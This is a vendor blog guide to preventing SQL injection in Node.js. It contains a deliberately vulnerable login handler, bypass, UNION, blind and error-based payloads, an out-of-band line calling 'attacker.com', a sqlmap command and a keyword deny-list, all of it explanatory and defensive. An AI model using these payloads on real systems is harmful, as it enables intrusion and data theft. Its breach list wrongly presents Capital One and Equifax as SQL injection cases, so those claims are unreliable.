---
title: "SQL Injection Prevention: Developer's Complete Guide"
description: "Learn what SQL Injection is, how it works, and comprehensive methods to prevent it in your Node.js applications with practical examples."
date: "2025-01-17"
author: "VibeScan Security Team"
tags: ["SQL Injection", "database security", "web security", "Node.js"]
image: "/blog/sql-injection.png"
---

SQL Injection is one of the oldest and most dangerous web application vulnerabilities. Consistently ranking high in the OWASP Top 10, this attack is still found on many websites today.

## What is SQL Injection?

SQL Injection is an attack technique where attackers inject malicious SQL code into an application's SQL queries to manipulate the database.

### Real-World Incidents
- **2023 MOVEit Breach**: SQL Injection led to data breaches at hundreds of companies
- **2019 Capital One Incident**: Over 100 million customer records exposed
- **2017 Equifax Hack**: 143 million people's personal information leaked

## How SQL Injection Works

### Basic Example

Suppose a login form is implemented like this:

```javascript
// Vulnerable code
app.post('/login', async (req, res) => {
  const { username, password } = req.body;

  const query = `
    SELECT * FROM users
    WHERE username = '${username}'
    AND password = '${password}'
  `;

  const user = await db.query(query);

  if (user) {
    res.json({ success: true });
  } else {
    res.json({ success: false });
  }
});
```

### Attack Scenario

If an attacker inputs the following as username:
```
username: admin' OR '1'='1
password: anything
```

The actual executed SQL query:
```sql
SELECT * FROM users
WHERE username = 'admin' OR '1'='1'
AND password = 'anything'
```

Since `'1'='1'` is always true, login succeeds without a password!

### Union-Based SQL Injection

A more dangerous attack example:
```
username: ' UNION SELECT username, password FROM users--
password: anything
```

Executed query:
```sql
SELECT * FROM users
WHERE username = '' UNION SELECT username, password FROM users--'
AND password = 'anything'
```

This can steal all user information.

## Types of SQL Injection

### 1. In-band SQL Injection

The most common form where attackers can see results through the same channel.

**Error-based:**
```sql
' AND 1=CONVERT(int, (SELECT @@version))--
```

**Union-based:**
```sql
' UNION SELECT null, username, password FROM users--
```

### 2. Blind SQL Injection

Used when server responses are limited.

**Boolean-based:**
```sql
' AND 1=1-- (True response)
' AND 1=2-- (False response)
```

**Time-based:**
```sql
'; WAITFOR DELAY '00:00:05'--
```

### 3. Out-of-band SQL Injection

Extracting data through DNS or HTTP requests.

```sql
'; EXEC xp_dirtree '\\attacker.com\share'--
```

## Preventing SQL Injection in Node.js

### 1. Prepared Statements (Most Recommended)

#### MySQL (mysql2 package)
```javascript
const mysql = require('mysql2/promise');

const pool = mysql.createPool({
  host: 'localhost',
  user: 'root',
  database: 'mydb',
  waitForConnections: true,
  connectionLimit: 10
});

// Secure code
app.post('/login', async (req, res) => {
  const { username, password } = req.body;

  try {
    const [rows] = await pool.execute(
      'SELECT * FROM users WHERE username = ? AND password = ?',
      [username, password]
    );

    if (rows.length > 0) {
      res.json({ success: true });
    } else {
      res.json({ success: false, message: 'Invalid credentials' });
    }
  } catch (error) {
    console.error(error);
    res.status(500).json({ error: 'Server error' });
  }
});
```

#### PostgreSQL (pg package)
```javascript
const { Pool } = require('pg');

const pool = new Pool({
  user: 'dbuser',
  host: 'localhost',
  database: 'mydb',
  password: 'password',
  port: 5432,
});

app.post('/login', async (req, res) => {
  const { username, password } = req.body;

  try {
    const result = await pool.query(
      'SELECT * FROM users WHERE username = $1 AND password = $2',
      [username, password]
    );

    if (result.rows.length > 0) {
      res.json({ success: true });
    } else {
      res.json({ success: false });
    }
  } catch (error) {
    console.error(error);
    res.status(500).json({ error: 'Server error' });
  }
});
```

### 2. Using ORM (Sequelize)

ORMs automatically use Prepared Statements.

```javascript
const { Sequelize, DataTypes } = require('sequelize');

const sequelize = new Sequelize('database', 'username', 'password', {
  host: 'localhost',
  dialect: 'mysql'
});

const User = sequelize.define('User', {
  username: {
    type: DataTypes.STRING,
    allowNull: false,
    unique: true
  },
  password: {
    type: DataTypes.STRING,
    allowNull: false
  }
});

app.post('/login', async (req, res) => {
  const { username, password } = req.body;

  try {
    const user = await User.findOne({
      where: {
        username: username,
        password: password // Use hashed password in production
      }
    });

    if (user) {
      res.json({ success: true });
    } else {
      res.json({ success: false });
    }
  } catch (error) {
    console.error(error);
    res.status(500).json({ error: 'Server error' });
  }
});
```

### 3. Using TypeORM (TypeScript)

```typescript
import { Entity, PrimaryGeneratedColumn, Column, createConnection } from 'typeorm';
import { Request, Response } from 'express';

@Entity()
class User {
  @PrimaryGeneratedColumn()
  id: number;

  @Column()
  username: string;

  @Column()
  password: string;
}

async function login(req: Request, res: Response) {
  const { username, password } = req.body;

  const connection = await createConnection();
  const userRepository = connection.getRepository(User);

  try {
    const user = await userRepository.findOne({
      where: { username, password }
    });

    if (user) {
      res.json({ success: true });
    } else {
      res.json({ success: false });
    }
  } catch (error) {
    console.error(error);
    res.status(500).json({ error: 'Server error' });
  }
}
```

### 4. Input Validation and Escaping

```javascript
const validator = require('validator');

app.post('/search', async (req, res) => {
  const { searchTerm } = req.body;

  // Input validation
  if (!validator.isAlphanumeric(searchTerm, 'en-US', { ignore: ' ' })) {
    return res.status(400).json({
      error: 'Search term can only contain letters and numbers'
    });
  }

  // Length limit
  if (searchTerm.length > 50) {
    return res.status(400).json({
      error: 'Search term cannot exceed 50 characters'
    });
  }

  // Use Prepared Statement
  const [results] = await pool.execute(
    'SELECT * FROM products WHERE name LIKE ?',
    [`%${searchTerm}%`]
  );

  res.json(results);
});
```

### 5. Whitelist Approach

```javascript
// Sort field whitelist
const allowedSortFields = ['name', 'price', 'created_at'];
const allowedSortOrders = ['ASC', 'DESC'];

app.get('/products', async (req, res) => {
  let { sortBy, order } = req.query;

  // Whitelist validation
  if (!allowedSortFields.includes(sortBy)) {
    sortBy = 'created_at'; // Default
  }

  if (!allowedSortOrders.includes(order)) {
    order = 'DESC'; // Default
  }

  // ORDER BY cannot use Prepared Statements
  // Only use whitelisted values
  const query = `SELECT * FROM products ORDER BY ${sortBy} ${order}`;
  const [results] = await pool.query(query);

  res.json(results);
});
```

## Additional Security Best Practices

### 1. Principle of Least Privilege

Grant database users only the minimum necessary permissions.

```sql
-- Create read-only user
CREATE USER 'readonly'@'localhost' IDENTIFIED BY 'password';
GRANT SELECT ON mydb.* TO 'readonly'@'localhost';

-- Application user (can INSERT, UPDATE, DELETE but not DROP)
CREATE USER 'appuser'@'localhost' IDENTIFIED BY 'password';
GRANT SELECT, INSERT, UPDATE, DELETE ON mydb.* TO 'appuser'@'localhost';
```

### 2. Hide Error Messages

```javascript
app.use((err, req, res, next) => {
  // Show detailed errors only in development
  if (process.env.NODE_ENV === 'development') {
    console.error(err.stack);
  }

  // Show generic message in production
  res.status(500).json({
    error: 'Internal server error'
  });
});
```

### 3. Use WAF (Web Application Firewall)

```javascript
// SQL Injection protection middleware for Express
const sqlInjectionProtection = (req, res, next) => {
  const sqlPattern = /(\b(SELECT|INSERT|UPDATE|DELETE|DROP|CREATE|ALTER|EXEC|EXECUTE|UNION|DECLARE)\b)|(-{2})|\/\*|\*\/|;/gi;

  const checkInput = (obj) => {
    for (let key in obj) {
      if (typeof obj[key] === 'string' && sqlPattern.test(obj[key])) {
        return true;
      }
      if (typeof obj[key] === 'object') {
        if (checkInput(obj[key])) return true;
      }
    }
    return false;
  };

  if (checkInput(req.body) || checkInput(req.query) || checkInput(req.params)) {
    return res.status(400).json({
      error: 'Invalid input detected'
    });
  }

  next();
};

app.use(sqlInjectionProtection);
```

## Testing for SQL Injection

### Manual Testing

Basic payloads:
```
' OR '1'='1
' OR '1'='1'--
' OR '1'='1'/*
admin'--
admin' #
' UNION SELECT NULL--
' UNION SELECT NULL, NULL--
```

### Automation Tools

1. **SQLMap**
```bash
sqlmap -u "http://example.com/login" --data="username=admin&password=test" --batch
```

2. **VibeScan**
VibeScan includes SQL Injection testing in its 12,000+ vulnerability patterns.

```bash
# Scan entire website with VibeScan
# Simply enter URL at https://vibescan.co.kr/en
```

## Practical Checklist

Check these items during development:

- [ ] Use Prepared Statements for all database queries
- [ ] Validate user input with whitelist approach
- [ ] Prevent DB structure exposure in error messages
- [ ] Minimize database user permissions
- [ ] Minimize raw queries when using ORM
- [ ] Conduct regular security scans
- [ ] Check for SQL Injection vulnerabilities during code review

## Conclusion

SQL Injection is an old vulnerability but still dangerous. Fortunately, most attacks can be prevented by using Prepared Statements and ORMs.

Most important points:
1. **Never trust user input**
2. **Always use Prepared Statements**
3. **Conduct regular security scans**

With VibeScan, you can automatically check for SQL Injection and 12,000+ other vulnerabilities. [Start for free](https://vibescan.co.kr/en) today!

---

**References:**
- [OWASP SQL Injection Prevention Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/SQL_Injection_Prevention_Cheat_Sheet.html)
- [PortSwigger SQL Injection Guide](https://portswigger.net/web-security/sql-injection)
